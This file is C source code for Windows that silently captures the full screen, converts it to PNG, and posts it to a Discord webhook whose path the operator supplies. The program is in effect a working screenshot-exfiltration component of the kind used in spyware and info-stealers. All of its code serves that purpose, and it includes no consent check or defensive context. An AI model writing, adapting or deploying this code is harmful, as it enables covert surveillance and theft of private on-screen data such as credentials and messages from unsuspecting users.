#include <Windows.h>
#include <WinInet.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include "lodepng.h"

#pragma comment (lib, "Wininet.lib")

int captureScreen(unsigned char **pngImage, size_t *pngSize);
int decodeBMP(uint8_t** image, uint32_t* w, uint32_t* h, const uint8_t* bmp);
int sendWebhook(unsigned char* image, size_t imageSize, LPCWSTR webhookURL);

int main(int argc, char* argv[]) {
    LPCWSTR webhookURL = L""; // Your webhook, only the path for eg: /api/webhooks/etc
    unsigned char* pngImage;
    size_t pngSize;
    if (captureScreen(&pngImage, &pngSize)) {
        puts("[x] Failed to capture screen.");
        return -1;
    }
    puts("[+] Captured Screenshot.\n");

    if (sendWebhook(pngImage, pngSize, webhookURL)) {
        puts("[x] Failed to send webhook.");
        free(pngImage);
        return -1;
    }

    puts("[+] Sent screenshot with webhook.");
    free(pngImage);
    return 0;
}

int captureScreen(unsigned char **pngImage, size_t* pngSize) {
    int RETURN_VAL = 0;

    HDC hdcScreen;
    HDC memoryDC;
    HBITMAP hBitMap;
    BITMAP bmpScreen;
    DWORD dwDibSize;
    int screenX = GetSystemMetrics(SM_CXSCREEN);
    int screenY = GetSystemMetrics(SM_CYSCREEN);

    // Get Screen DC and create memory DC to store bitmap
    hdcScreen = GetDC(NULL);
    memoryDC = CreateCompatibleDC(hdcScreen);

    // Create compatible bitmap
    hBitMap = CreateCompatibleBitmap(hdcScreen, screenX, screenY);
    if (!hBitMap) {
        puts("[x] CreateCompatibleBitmap Failed");
        RETURN_VAL = -1;
        goto cleanup;
    }

    // Select bitmap into our memory DC
    SelectObject(memoryDC, hBitMap);

    // Bitblock transfer to memory DC
    if (!BitBlt(memoryDC, 0, 0, screenX, screenY, hdcScreen, 0, 0, SRCCOPY)) {
        puts("[x] BitBlt Failed");
        RETURN_VAL = -1;
        goto cleanup;
    }

    // Get bitmap
    GetObject(hBitMap, sizeof(BITMAP), &bmpScreen);

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    bmfHeader.bfType = 0x4D42; // 'BM'
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = bmfHeader.bfOffBits + ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;

    // Allocate Memory
    dwDibSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
    BYTE* lpBitMap = (BYTE*)GlobalAlloc(GPTR, dwDibSize);
    if (!lpBitMap) {
        puts("[x] GlobalAlloc Failed.");
        RETURN_VAL = -1;
        goto cleanup;
    }

    // Write bitmap to Allocated memory
    if (!GetDIBits(memoryDC, hBitMap, 0, (UINT)bmpScreen.bmHeight, lpBitMap, (BITMAPINFO*)&bi, DIB_RGB_COLORS)) {
        puts("[x] GetDIBits Failed.");
        RETURN_VAL = -1;
        goto cleanup;
    }

    // Allocate full bitmap
    uint8_t* fullBitMap = malloc(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwDibSize);
    if (!fullBitMap) {
        puts("[x] Failed to allocate memory for fullBitMap.");
        RETURN_VAL = -1;
        goto cleanup;
    }

    memcpy(fullBitMap, &bmfHeader, sizeof(BITMAPFILEHEADER));
    memcpy(fullBitMap + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
    memcpy(fullBitMap + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), lpBitMap, dwDibSize);

    // Decode BMP to image data
    uint8_t* image;
    uint32_t width, height;
    int error = decodeBMP(&image, &width, &height, fullBitMap);
    if (error) {
        printf("[x] decodeBMP failed with code: %d\n", error);
        RETURN_VAL = -1;
        goto cleanup1;
    }

    // Encode image data to PNG
    error = lodepng_encode32(pngImage, pngSize, image, width, height);
    if (error) {
        printf("[x] lodepng_encode32 Failed with error %d\n", error);
        RETURN_VAL = -1;
        goto cleanup2;
    }

cleanup2:
    free(image);
cleanup1:
    GlobalFree(lpBitMap);
    free(fullBitMap);
cleanup:
    if (hBitMap)
        DeleteObject(hBitMap);
    DeleteDC(memoryDC);
    ReleaseDC(NULL, hdcScreen);
    return RETURN_VAL;
}

int decodeBMP(uint8_t** image, uint32_t* w, uint32_t* h, const uint8_t* bmp) {
    const uint32_t MINHEADER = 54;

    if (bmp[0] != 'B' || bmp[1] != 'M') return 1;
    uint32_t pixeloffset = bmp[10] + 256 * bmp[11];
    *w = bmp[18] + bmp[19] * 256;
    *h = bmp[22] + bmp[23] * 256;
    if (bmp[28] != 24 && bmp[28] != 32) return 2;
    uint32_t numChannels = bmp[28] / 8;

    uint32_t scanlineBytes = *w * numChannels;
    if (scanlineBytes % 4 != 0) scanlineBytes = (scanlineBytes / 4) * 4 + 4;

    uint32_t dataSize = scanlineBytes * *h;
    if (bmp[dataSize + pixeloffset] == 0) return 3;

    *image = (uint8_t*)malloc(dataSize);
    if (!(*image)) return -1;

    for (uint32_t y = 0; y < *h; y++) {
        for (uint32_t x = 0; x < *w; x++) {
            uint32_t bmpos = pixeloffset + (*h - y - 1) * scanlineBytes + numChannels * x;
            uint32_t newpos = 4 * y * *w + 4 * x;
            if (numChannels == 3) {
                (*image)[newpos + 0] = bmp[bmpos + 2]; // R
                (*image)[newpos + 1] = bmp[bmpos + 1]; // G
                (*image)[newpos + 2] = bmp[bmpos + 0]; // B
                (*image)[newpos + 3] = 255;            // A
            }
            else {
                (*image)[newpos + 0] = bmp[bmpos + 2]; // R
                (*image)[newpos + 1] = bmp[bmpos + 1]; // G
                (*image)[newpos + 2] = bmp[bmpos + 0]; // B
                (*image)[newpos + 3] = bmp[bmpos + 3]; // A
            }
        }
    }
    return 0;
}

int sendWebhook(unsigned char* image, size_t imageSize, LPCWSTR webhookURL) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    BOOL bKeepGoing = TRUE;
    DWORD dwBytesWritten = 0;
    char* boundary = "25fe72ab4e7619ba272a7558abc2c52b";
    char* endBoundary = "\r\n--25fe72ab4e7619ba272a7558abc2c52b--\r\n";
    char* startBoundary = "\r\n--25fe72ab4e7619ba272a7558abc2c52b\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"sc.png\"\r\n"
        "Content-Type: image/png\r\n"
        "\r\n";

    // Initialize WinINet
    hSession = InternetOpen(L"HTTP Example", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hSession) {
        printf("[x] InternetOpen failed with error: %lu\n", GetLastError());
        return 1;
    }

    hConnect = InternetConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("[x] InternetConnect failed with error: %lu\n", GetLastError());
        InternetCloseHandle(hSession);
        return 1;
    }

    hRequest = HttpOpenRequest(hConnect, L"POST", webhookURL, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        printf("[x] HttpOpenRequest failed with error: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return 1;
    }

    DWORD totalSize = (DWORD)(strlen(startBoundary) + imageSize + strlen(endBoundary));
    char* postData = (char*)malloc(totalSize);
    if (!postData) {
        printf("[x] Failed to allocate memory for post data.\n");
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return 1;
    }

    memcpy(postData, startBoundary, strlen(startBoundary));
    memcpy(postData + strlen(startBoundary), image, imageSize);
    memcpy(postData + strlen(startBoundary) + imageSize, endBoundary, strlen(endBoundary));

    // Allocate enough space for the headers
    int headerLen = swprintf(NULL, 0, L"Content-Length: %zu\r\nContent-Type: multipart/form-data; boundary=%hs\r\n", imageSize + strlen(startBoundary) + strlen(endBoundary), boundary);
    wchar_t* headers = malloc((headerLen + 1) * sizeof(wchar_t));
    if (!headers) {
        printf("[x] Failed to allocate memory for headers.\n");
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        free(postData);
        return 1;
    }

    swprintf(headers, headerLen + 1, L"Content-Length: %zu\r\nContent-Type: multipart/form-data; boundary=%hs\r\n", imageSize + strlen(startBoundary) + strlen(endBoundary), boundary);
    bResults = HttpSendRequest(hRequest, headers, (DWORD)(wcslen(headers)), postData, totalSize);

    if (!bResults)
        printf("[x] HttpSendRequest failed with error: %lu\n", GetLastError());

    // Clean up
    free(headers);
    free(postData);
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hSession) InternetCloseHandle(hSession);

    return bResults ? 0 : 1;
}
